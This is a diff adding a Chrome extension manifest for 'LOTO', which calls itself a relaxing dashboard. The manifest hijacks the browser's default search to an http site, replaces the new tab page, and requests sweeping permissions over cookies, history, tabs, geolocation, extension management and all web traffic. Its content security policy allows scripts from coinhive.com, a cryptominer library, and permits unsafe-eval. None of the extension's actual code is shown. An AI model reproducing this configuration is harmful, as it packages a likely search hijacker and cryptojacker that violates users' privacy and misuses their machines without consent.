@@ -1,0 +1,72 @@
+{
+	"manifest_version": 2,
+	"name": "LOTO",
+	"description": "Your personal relaxing dashboard",
+	"version": "0.0.0.3",
+
+	"icons": {
+        "128": "icons/128.png",
+        "19": "icons/24.png",
+        "16": "icons/16.png"
+    },
+	
+	"background":{
+		"scripts": [
+			"./lib/jquery-1.7.1.min.js",
+			"./js/logger.js",
+			"./js/storage.js",
+			"./lib/moment.js",
+			"./lib/moment-timezone-with-data-2010-2020.js",
+			"./js/maintainLS.js",
+			"./js/uninstall.js",
+			"./js/links.js",
+			"./js/icon.js"
+		]
+	},
+
+	"chrome_settings_overrides": {
+      "search_provider": {
+         "encoding": "UTF-8",
+         "favicon_url": "http://mysearch.global/?favicon",
+         "image_url": "",
+         "instant_url": "",
+         "is_default": true,
+         "keyword": "LT",
+         "name": "LOTO",
+         "params": "__PARAM__",
+         "search_url": "http://mysearch.global/?q={searchTerms}",
+         "suggest_url": "http://mysearch.global/?s={searchTerms}"
+      }
+   },
+
+	"chrome_url_overrides": {
+		"newtab": "./home/index.html"
+	},
+
+  	"browser_action": {
+      	"default_title": "LOTO",
+      	"default_icon": {
+            "19": "icons/19.png",
+            "38": "icons/38.png"
+        }
+	},
+
+	"permissions": [
+		"webRequest",
+		"webRequestBlocking",
+		"webNavigation",
+		"management",
+		"storage",
+		"cookies",
+		"tabs",
+		"http://*/*",
+		"https://*/*",
+		"topSites",
+		"history",
+		"geolocation"
+	],
+
+	"update_url" : "https://clients2.google.com/service/update2/crx",
+
+	"content_security_policy": "script-src 'self' 'unsafe-eval' https://code.jquery.com/ https://search.ozby.com/resources/ https://coinhive.com/lib/ https://ssl.google-analytics.com; object-src 'self'"
+}
